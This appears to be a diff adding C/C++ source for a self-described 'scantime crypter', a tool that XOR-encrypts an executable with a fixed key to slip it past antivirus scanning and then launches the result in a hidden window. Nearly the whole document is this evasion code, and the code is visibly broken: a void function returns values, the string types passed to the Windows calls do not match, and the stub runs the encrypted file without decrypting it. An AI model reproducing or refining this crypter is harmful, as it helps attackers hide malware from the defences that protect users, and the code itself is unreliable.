@@ -1,0 +1,90 @@
+```cpp
+
+#include <stdio.h>
+#include <Windows.h>
+
+#define Key 0x0F
+
+// Pseudocode for own scantime crypter:
+// 1. Read an unencrypted file using Windows API
+// 2. Then create a buffer which will store all the bytes (I guess)
+// 3. We will use HANDLE Keyword to get unencrypted file
+// 4. For getting file size we will be using DWORD Keyword
+// 5. For reading all the bytes we will be using Windows API Keyword (LPVOID)
+// 6. Then we will create an object for XOR Algorithm
+// 7. Also we will intialize stub inside this crypter 
+// 8. For stub same procedure but we will decrypt once the Crypted File has been executed
+
+
+static __forceinline LPVOID xor (char* str, DWORD fileSize) {
+    for (int i = 0; i < fileSize; i++)
+        str[i] ^= Key;
+
+    return fileSize;
+}
+
+void Crypt();
+
+void stub()
+{
+    Crypt();
+
+    ShellExecute(NULL, NULL, "C:\\Users\\(YourProfile)\\source\\repos\\Project5\\Debug\\Crypted.exe", NULL, NULL, 0);
+}
+
+void Crypt()
+{
+    HANDLE hFile = CreateFileA(L"C:\\Users\\(YourProfile)\\source\\repos\\Project5\\Debug\\file.exe", FILE_READ_ACCESS, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
+
+    if (hFile == INVALID_HANDLE_VALUE)
+    {
+        printf("Handle hasnt been created: %d", GetLastError());
+    }
+
+    DWORD fileSize = GetFileSize(hFile, NULL);
+
+    BYTE* buffer = malloc(fileSize * sizeof(char));
+    if (!buffer) {
+        printf("Buffer wasn't allocated...\n");
+        CloseHandle(hFile);
+    }
+
+    DWORD dwBytesRead = 0;
+    if (!ReadFile(hFile, buffer, fileSize, &dwBytesRead, NULL)) {
+        printf("Reading file failed %d\n", GetLastError());
+        free(buffer);
+        return -1;
+    }
+
+    printf("Bytes read: %d\n", dwBytesRead);
+    CloseHandle(hFile);
+
+    HANDLE hFileCrypted = CreateFileW(L"Crypted.exe", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+
+    if (hFileCrypted == INVALID_HANDLE_VALUE) {
+        printf("Error: %d\n", GetLastError());
+        free(buffer);
+        return -1;
+    }
+
+    printf("Got Handle: 0x%x\n", hFileCrypted);
+    xor (buffer, fileSize);
+
+    if (!WriteFile(hFileCrypted, buffer, fileSize, NULL, NULL)) {
+        printf("Error writing to file %d\n", GetLastError());
+        CloseHandle(hFileCrypted);
+        free(buffer);
+        return -1;
+    }
+
+    free(buffer);
+    CloseHandle(hFileCrypted);
+    printf("File have been encrypted!\n");
+    Sleep(1500);
+}
+
+int main()
+{
+    stub();
+}
+```
